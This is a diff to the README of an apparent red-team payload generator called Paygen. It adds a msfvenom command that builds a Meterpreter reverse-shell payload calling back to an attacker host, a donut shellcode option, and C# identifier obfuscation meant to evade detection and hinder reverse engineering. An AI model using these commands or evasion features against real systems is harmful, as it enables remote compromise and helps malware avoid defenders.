@@ -27,6 +27,7 @@ Paygen is a dual-interface payload generation framework for security researchers
 - 🖥️ **Beautiful TUI** - Catppuccin Mocha theme with vim-style navigation
 - 📋 **Recipe System** - YAML-based payload definitions with rich metadata
 - 🔄 **Preprocessing** - Chain XOR/AES encryption, compression, encoding
+- 🔀 **Preprocessing Options** - Select between multiple shellcode generation methods (msfvenom, donut, custom)
 - 🎯 **MITRE ATT&CK** - Built-in tactic and technique mappings
 - 📊 **Effectiveness** - HIGH/MEDIUM/LOW evasion ratings
 - 📜 **History** - Track all builds with parameters and launch instructions
@@ -169,6 +170,20 @@ preprocessing:
     name: "generate_shellcode"
     command: "msfvenom -p windows/x64/... LHOST={{ lhost }} -f raw"
     output_var: "shellcode"
+  
+  # Option type: Choose between multiple methods
+  - type: "option"
+    name: "Select shellcode generation method"
+    options:
+      - type: "command"
+        name: "Msfvenom shellcode"
+        command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} -f raw"
+        output_var: "raw_shellcode"
+      - type: "command"
+        name: "Donut shellcode"
+        command: "donut -f {{ executable_path }} -a 2"
+        output_var: "raw_shellcode"
+  
   - type: "script"
     name: "encrypt"
     script: "aes_encrypt.py"
@@ -199,6 +214,33 @@ Located in `preprocessors/`:
 - `compress.py` - Gzip compression
 - `format_csharp.py` - Format bytes as C# arrays
 - `caesar_cipher.py` - Caesar cipher
+- `hex_to_bytes.py` - Convert hex strings to raw bytes
+
+---
+
+## Conditional Parameters
+
+Parameters can be conditionally required based on preprocessing option selection using the `required_for` field:
+
+```yaml
+parameters:
+  - name: "lhost"
+    type: "ip"
+    description: "Attacker IP address"
+    required_for: "Msfvenom shellcode"  # Only required when this option is selected
+    required: true
+  
+  - name: "executable_path"
+    type: "file"
+    description: "Path to executable for donut"
+    required_for: "Donut shellcode"  # Only required when this option is selected
+    required: true
+```
+
+When using conditional parameters:
+- The parameter is only validated and displayed when its corresponding preprocessing option is selected
+- Default values are automatically restored when switching between options
+- Parameters without `required_for` are always shown and validated
 
 ---
 
@@ -290,6 +332,31 @@ Obfuscate PowerShell code blocks within launch instructions across all recipe ty
 - **Universal**: Works with any recipe type (C#, Python, etc.) that includes PowerShell commands in launch instructions
 
 Obfuscation helps evade signature-based detection and makes reverse engineering more difficult.
+
+### C# Obfuscation
+
+#### Name Obfuscation
+
+When building C# (.cs) templates via the web interface, you can enable automatic name obfuscation:
+
+- **Enabled by default** - Checkbox is pre-selected for C# recipes
+- **Function & Variable Replacement**: Replaces all function and variable names with innocuous-looking identifiers
+- **Innocuous Names**: Uses nature-themed and common words (forest, lake, mountain, table, chair, etc.) and numbered variants (var1, obj1, temp1)
+- **Smart Filtering**: 
+  - Preserves C# keywords and reserved words
+  - Keeps .NET framework types and methods (Console, WriteLine, Marshal, etc.)
+  - Skips private members (starting with underscore)
+  - Maintains compatibility with P/Invoke declarations
+- **Applied Before Compilation**: Obfuscation runs before the compilation step
+- **Build Progress**: Shows replacement count in real-time during payload generation
+
+Example replacements:
+- `shellcode` → `forest`
+- `processHandle` → `lake`
+- `allocatedMemory` → `mountain`
+- `bufferSize` → `var1`
+
+This makes reverse engineering more difficult by replacing meaningful variable and function names with benign-looking identifiers that don't reveal the code's purpose.
 
 ### AMSI Bypass Integration
 
